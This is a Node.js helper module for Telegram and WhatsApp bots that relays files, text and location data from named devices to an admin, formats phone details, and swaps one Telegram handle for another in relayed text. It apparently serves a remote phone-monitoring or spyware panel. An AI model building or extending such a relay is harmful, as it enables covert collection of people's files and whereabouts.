/**
 * Shared utility functions for both Telegram and WhatsApp bots
 */

const axios = require('axios');
const fs = require('fs');
const path = require('path');

/**
 * Handles file uploads to be sent to admin
 * @param {Object} file - File object with buffer and metadata
 * @param {String} source - Source of the file (device model/name)
 * @param {Function} sendToTelegram - Function to send file to Telegram
 * @param {Function} sendToWhatsApp - Function to send file to WhatsApp
 */
const handleFileUpload = async (file, source, sendToTelegram, sendToWhatsApp) => {
  try {
    // Send to both platforms
    await sendToTelegram(file, source);
    await sendToWhatsApp(file, source);
    return true;
  } catch (error) {
    console.error('Error handling file upload:', error);
    return false;
  }
};

/**
 * Handles text uploads to be sent to admin
 * @param {String} text - Text content
 * @param {String} source - Source of the text (device model/name)
 * @param {Function} sendToTelegram - Function to send text to Telegram
 * @param {Function} sendToWhatsApp - Function to send text to WhatsApp
 */
const handleTextUpload = async (text, source, sendToTelegram, sendToWhatsApp) => {
  try {
    // Clean text if needed
    let cleanedText = text;
    if (text.includes('@shivayadavv')) {
      cleanedText = text.replace(/@shivayadavv/g, '@sisuryaofficial');
    }
    
    // Send to both platforms
    await sendToTelegram(cleanedText, source);
    await sendToWhatsApp(cleanedText, source);
    return true;
  } catch (error) {
    console.error('Error handling text upload:', error);
    return false;
  }
};

/**
 * Handles location data to be sent to admin
 * @param {Object} location - Location object with lat and lon
 * @param {String} source - Source of the location (device model/name)
 * @param {Function} sendToTelegram - Function to send location to Telegram
 * @param {Function} sendToWhatsApp - Function to send location to WhatsApp
 */
const handleLocationUpload = async (location, source, sendToTelegram, sendToWhatsApp) => {
  try {
    // Send to both platforms
    await sendToTelegram(location, source);
    await sendToWhatsApp(location, source);
    return true;
  } catch (error) {
    console.error('Error handling location upload:', error);
    return false;
  }
};

/**
 * Makes a web request to the specified URL
 * @param {String} url - URL to request
 * @returns {Promise} - Response data
 */
const makeWebRequest = async (url) => {
  try {
    const response = await axios.get(url);
    return response.data;
  } catch (error) {
    console.error('Error making web request:', error);
    throw error;
  }
};

/**
 * Formats device information for display
 * @param {Object} device - Device information object
 * @returns {String} - Formatted device information
 */
const formatDeviceInfo = (device) => {
  return `📱 DEVICE INFO\n\n` +
    `• MODEL: ${device.model || 'Unknown'}\n` +
    `• BATTERY: ${device.battery || 'Unknown'}\n` +
    `• VERSION: ${device.version || 'Unknown'}\n` +
    `• PROVIDER: ${device.provider || 'Unknown'}\n` +
    `• BRIGHTNESS: ${device.brightness || 'Unknown'}`;
};

/**
 * Creates a temporary file from buffer
 * @param {Buffer} buffer - File buffer
 * @param {String} filename - Filename
 * @returns {String} - Path to temporary file
 */
const createTempFile = (buffer, filename) => {
  const tempDir = path.join(__dirname, 'temp');
  if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
  }
  
  const filePath = path.join(tempDir, filename);
  fs.writeFileSync(filePath, buffer);
  return filePath;
};

module.exports = {
  handleFileUpload,
  handleTextUpload,
  handleLocationUpload,
  makeWebRequest,
  formatDeviceInfo,
  createTempFile
};
